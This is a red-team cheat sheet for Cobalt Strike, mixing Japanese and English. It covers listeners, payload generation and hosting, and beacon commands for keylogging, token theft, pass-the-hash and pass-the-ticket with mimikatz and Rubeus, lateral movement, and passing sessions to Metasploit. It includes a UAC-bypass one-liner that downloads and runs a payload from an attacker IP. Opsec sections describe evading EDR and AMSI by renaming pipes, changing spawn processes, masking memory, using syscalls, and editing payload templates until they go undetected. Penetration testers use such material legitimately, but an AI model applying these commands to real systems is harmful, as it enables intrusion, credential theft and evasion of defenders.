# Cobalt Strike

{{#include ../banners/hacktricks-training.md}}

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit` その後、どこで待ち受けるか、どの種類の beacon を使うか (http, dns, smb...) などを選択できます。

### Peer2Peer Listeners

これらのリスナーの beacon は直接 C2 と通信する必要はなく、他の beacon を経由して通信できます。

`Cobalt Strike -> Listeners -> Add/Edit` その後、TCP または SMB beacon を選択します

* The **TCP beacon will set a listener in the port selected**。他の beacon から TCP beacon に接続するには、`connect <ip> <port>` コマンドを使用します
* The **smb beacon will listen in a pipename with the selected name**。SMB beacon に接続するには、`link [target] [pipe]` コマンドを使用します

### Generate & Host payloads

#### Generate payloads in files

`Attacks -> Packages ->`

* **`HTMLApplication`** — HTA ファイル用
* **`MS Office Macro`** — マクロを含む Office ドキュメント用
* **`Windows Executable`** — .exe、.dll、またはサービス用 .exe
* **`Windows Executable (S)`** — **stageless** .exe、.dll、またはサービス用 .exe（stageless の方が staged より良く、IoCs が少ない）

#### Generate & Host payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` これにより、cobalt strike から beacon をダウンロードするスクリプト/実行ファイルが生成されます。フォーマット例: bitsadmin、exe、powershell、python

#### Host Payloads

ホストしたいファイルを既にウェブサーバに用意している場合は、`Attacks -> Web Drive-by -> Host File` に移動し、ホストするファイルとウェブサーバの設定を選択します。

### Beacon Options

<details>
<summary>Beacon オプションとコマンド</summary>
```bash
# Execute local .NET binary
execute-assembly </path/to/executable.exe>
# Note that to load assemblies larger than 1MB, the 'tasks_max_size' property of the malleable profile needs to be modified.

# Screenshots
printscreen    # Take a single screenshot via PrintScr method
screenshot     # Take a single screenshot
screenwatch    # Take periodic screenshots of desktop
## Go to View -> Screenshots to see them

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes to see the keys pressed

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <just write powershell cmd here> # This uses the highest supported powershell version (not oppsec)
powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.


# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token generated with make_token
## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Like make_token but stealing the token from a process
steal_token [pid] # Also, this is useful for network actions, not local actions
## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated <current_username> - it's impersonating our own cloned token.
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token from steal_token

## Launch process with nwe credentials
spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).

## Pass the hash
## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Withuot /run, mimikatz spawn a cmd.exe, if you are running as a user with Desktop, he will see the shell (if you are running as SYSTEM you are good to go)
steal_token <pid> #Steal token from process created by mimikatz

## Pass the ticket
## Request a ticket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
make_token <domain>\<username> DummyPass
## Write the ticket in the attacker machine from a poweshell session & load it
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Generate a new process with the ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Steal the token from that process
steal_token <pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump insteresting ticket by luid
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Create new logon session, note luid and processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insert ticket in generate logon session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finally, steal the token from that new process
steal_token <pid>

# Lateral Movement
## If a token was created it will be used
jump [method] [target] [listener]
## Methods:
## psexec                    x86   Use a service to run a Service EXE artifact
## psexec64                  x64   Use a service to run a Service EXE artifact
## psexec_psh                x86   Use a service to run a PowerShell one-liner
## winrm                     x86   Run a PowerShell script via WinRM
## winrm64                   x64   Run a PowerShell script via WinRM
## wmi_msbuild               x64   wmi lateral movement with msbuild inline c# task (oppsec)


remote-exec [method] [target] [command] # remote-exec doesn't return output
## Methods:
## psexec                          Remote execute via Service Control Manager
## winrm                           Remote execute via WinRM (PowerShell)
## wmi                             Remote execute via WMI

## To execute a beacon with wmi (it isn't in the jump command) just upload the beacon and execute it
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## On metaploit host
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
beacon> spawn metasploit
## You can only spawn x86 Meterpreter sessions with the foreign listener.

# Pass session to Metasploit - Through shellcode injection
## On metasploit host
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Run msfvenom and prepare the multi/handler listener

## Copy bin file to cobalt strike host
ps
shinject <pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process

# Pass metasploit session to cobalt strike
## Fenerate stageless Beacon shellcode, go to Attacks > Packages > Windows Executable (S), select the desired listener, select Raw as the Output type and select Use x64 payload.
## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode


# Pivoting
## Open a socks proxy in the teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password
```
</details>

### Custom implants / Linux Beacons

- A custom agent only needs to speak the Cobalt Strike Team Server HTTP/S protocol (default malleable C2 profile) to register/check-in and receive tasks. Implement the same URIs/headers/metadata crypto defined in the profile to reuse the Cobalt Strike UI for tasking and output.
- An Aggressor Script (e.g., `CustomBeacon.cna`) can wrap payload generation for the non-Windows beacon so operators can select the listener and produce ELF payloads directly from the GUI.
- Example Linux task handlers exposed to the Team Server: `sleep`, `cd`, `pwd`, `shell` (exec arbitrary commands), `ls`, `upload`, `download`, and `exit`. These map to task IDs expected by the Team Server and must be implemented server-side to return output in the proper format.
- BOF support on Linux can be added by loading Beacon Object Files in-process with [TrustedSec's ELFLoader](https://github.com/trustedsec/ELFLoader) (supports Outflank-style BOFs too), allowing modular post-exploitation to run inside the implant's context/privileges without spawning new processes.
- Embed a SOCKS handler in the custom beacon to keep pivoting parity with Windows Beacons: when the operator runs `socks <port>` the implant should open a local proxy to route operator tooling through the compromised Linux host into internal networks.

## Opsec

### Execute-Assembly

The **`execute-assembly`** uses a **犠牲プロセス** using remote process injection to execute the indicated program. This is very noisy as to inject inside a process certain Win APIs are used that every EDR is checking. However, there are some custom tools that can be used to load something in the same process:

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- In Cobalt Strike you can also use BOF (Beacon Object Files): [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)

The agressor script `https://github.com/outflanknl/HelpColor` will create the `helpx` command in Cobalt Strike which will put colors in commands indicating if they are BOFs (green), if they are Frok&Run (yellow) and similar, or if they are ProcessExecution, injection or similar (red). Which helps to know which commands are more stealthy.

### Act as the user

You could check events like `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents`:

- Security EID 4624 - Check all the interactive logons to know the usual operating hours.
- System EID 12,13 - Check the shutdown/startup/sleep frequency.
- Security EID 4624/4625 - Check inbound valid/invalid NTLM attempts.
- Security EID 4648 - This event is created when plaintext credentials are used to logon. If a process generated it, the binary potentially has the credentials in clear text in a config file or inside the code.

When using `jump` from Cobalt Strike, it's better to use the `wmi_msbuild` method to make the new process look more legit.

### Use computer accounts

It's common for defenders to be checking weird behaviours generated from users and **exclude service accounts and computer accounts like `*$` from their monitoring**. You could use these accounts to perform lateral movement or privilege escalation.

### Use stageless payloads

Stageless payloads are less noisy than staged ones because they don't need to download a second stage from the C2 server. This means that they don't generate any network traffic after the initial connection, making them less likely to be detected by network-based defenses.

### Tokens & Token Store

Be careful when you steal or generate tokens because it might be possible for an EDR to enumerate all the tokens of all the threads and find a **token belonging to a different user** or even SYSTEM in the process.

This allows to store tokens **per beacon** so it's not needed to steal the same token again and again. This is useful for lateral movement or when you need to use a stolen token multiple times:

- token-store steal <pid>
- token-store steal-and-use <pid>
- token-store show
- token-store use <id>
- token-store remove <id>
- token-store remove-all

When moving laterally, usually is better to **steal a token than to generate a new one** or perform a pass the hash attack.

### Guardrails

Cobalt Strike has a feature called **Guardrails** that helps to prevent the use of certain commands or actions that could be detected by defenders. Guardrails can be configured to block specific commands, such as `make_token`, `jump`, `remote-exec`, and others that are commonly used for lateral movement or privilege escalation.

Moreover, the repo [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) also contains some checks and ideas you could consider before executing a payload.

### Tickets encryption

In an AD be careful with the encryption of the tickets. By default, some tools will use RC4 encryption for Kerberos tickets, which is less secure than AES encryption and by default up to date environments will use AES. This can be detected by defenders who are monitoring for weak encryption algorithms.

### Avoid Defaults

When using Cobalt Strike by default the SMB pipes will have the name `msagent_####` and `status_####`. Change those names. It's possible to check the names of the existing pipes from Cobalt Strike with the command: `ls \\.\pipe\`

Moreover, with SSH sessions a pipe called `\\.\pipe\postex_ssh_####` is created. Change it with `set ssh_pipename "<new_name>";`.

Also in postex exploitation attack the pipes `\\.\pipe\postex_####` can be modified with `set pipename "<new_name>"`.

In Cobalt Strike profiles you can also modify things like:

- Avoiding using `rwx`
- How the process injection behavior works (which APIs will be used) in the `process-inject {...}` block
- How the "fork and run" works in the `post-ex {…}` block
- The sleep time
- The max size of binaries to be loaded in memory
- The memory footprint and DLL content with `stage {...}` block
- The network traffic

### Bypass memory scanning

Some EDRs scan memory for some known malware signatures. Cobalt Strike allows to modify the `sleep_mask` function as a BOF that will be able to encrypt in memory the backdoor.

### Noisy proc injections

When injecting code into a process this is usually very noisy, this is because **no regular process usually performs this action and because the ways to do this are very limited**. Therefore, it could be detected by behaviour-based detection systems. Moreover, it could also be detected by EDRs scanning the network for **threads containing code that is not in disk** (although processes such as browsers using JIT have this commonly). Example: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | PID and PPID relationships

When spawning a new process it's important to **maintain a regular parent-child** relationship between processes to avoid detection. If svchost.exec is executing iexplorer.exe it'll look suspicious, as svchost.exe is not a parent of iexplorer.exe in a normal Windows environment.

When a new beacon is spawned in Cobalt Strike by default a process using **`rundll32.exe`** is created to run the new listener. This is not very stealthy and can be easily detected by EDRs. Moreover, `rundll32.exe` is run without any args making it even more suspicious.

With the following Cobalt Strike command, you can specify a different process to spawn the new beacon, making it less detectable:
```bash
spawnto x86 svchost.exe
```
You can also change this setting **`spawnto_x86` and `spawnto_x64`** in a profile.

### 攻撃者のトラフィックのプロキシ

攻撃者は、ローカル（場合によっては Linux マシン上）でツールを実行し、被害者のトラフィックをツールに届くようにする必要があることがあります（例: NTLM relay）。

さらに、pass-the.hash や pass-the-ticket 攻撃を行う際、被害者の LSASS プロセスを改変する代わりに、攻撃者が**自分のローカルの LSASS プロセスにそのハッシュやチケットを追加する**ことでそこから pivot する方がステルス性が高いことがあります。

ただし、生成されるトラフィックには**注意が必要**です。backdoor プロセスから通常とは異なるトラフィック（例: kerberos）を送信してしまう可能性があります。これを避けるために browser プロセスに pivot することも考えられますが、プロセスに injecting することで検知される可能性があるため、ステルスな実装方法を検討してください。


### AV 回避

#### AV/AMSI/ETW Bypass

関連ページを確認してください：

{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

通常、`/opt/cobaltstrike/artifact-kit` に、cobalt strike がバイナリ beacon を生成する際に使うペイロードのコードと事前コンパイル済みテンプレート（`/src-common`）が格納されています。

生成した backdoor（またはコンパイル済みテンプレート）を [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) で解析すると、何が defender の検知を引き起こしているかを特定できます。通常、それは文字列です。したがって、最終バイナリにその文字列が現れないように、backdoor を生成しているコードを修正すればよいです。

コードを修正したら、同じディレクトリで `./build.sh` を実行し、生成された `dist-pipe/` フォルダを Windows クライアントの `C:\Tools\cobaltstrike\ArtifactKit` にコピーしてください.
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
aggressive スクリプト `dist-pipe\artifact.cna` を読み込むのを忘れないでください。これにより Cobalt Strike に対して、ロードされているリソースではなくディスク上の我々が望むリソースを使用するよう指示できます。

#### リソースキット

ResourceKit フォルダには、PowerShell、VBA、HTA を含む Cobalt Strike のスクリプトベースのペイロード用テンプレートが含まれています。

テンプレートと [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) を組み合わせて使用すると、防御側（この場合は AMSI）が好まない箇所を特定して修正できます：
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
検出された行を変更することで、検出されないテンプレートを作成できます。

読み込まれたリソースではなくディスク上の指定したリソースを使用させるために、aggressive script `ResourceKit\resources.cna` をロードするのを忘れないでください。

#### Function hooks | Syscall

Function hooking は、マルウェアの活動を検出するために多くの EDRs が利用する一般的な手法です。Cobalt Strike は、標準の Windows API 呼び出しの代わりに **syscalls** を使用する（**`None`** 設定）、関数の `Nt*` 版を **`Direct`** 設定で使用する、あるいは malleable profile の **`Indirect`** オプションで `Nt*` 関数を飛ばすことで、これらのフックを回避できます。システムによっては、あるオプションが他よりもよりステルスになる場合があります。

これはプロファイルに設定するか、コマンド **`syscall-method`** を使って設定できます。

ただし、これにはノイズが伴うこともあります。

関数フックを回避するための Cobalt Strike のオプションのひとつは、これらのフックを取り除くことです: [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof)。

どの関数がフックされているかは、[**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) や [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector) で確認できます。




<details>
<summary>Misc Cobalt Strike commands</summary>
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```
</details>

## 参考文献

- [Cobalt Strike Linux Beacon (custom implant PoC)](https://github.com/EricEsquivel/CobaltStrike-Linux-Beacon)
- [TrustedSec ELFLoader & Linux BOFs](https://github.com/trustedsec/ELFLoader)
- [Outflank nix BOF template](https://github.com/outflanknl/nix_bof_template)
- [Unit42 analysis of Cobalt Strike metadata encryption](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/)
- [SANS ISC diary on Cobalt Strike traffic](https://isc.sans.edu/diary/27968)
- [cs-decrypt-metadata-py](https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/)
- [SentinelOne CobaltStrikeParser](https://github.com/Sentinel-One/CobaltStrikeParser)

{{#include ../banners/hacktricks-training.md}}
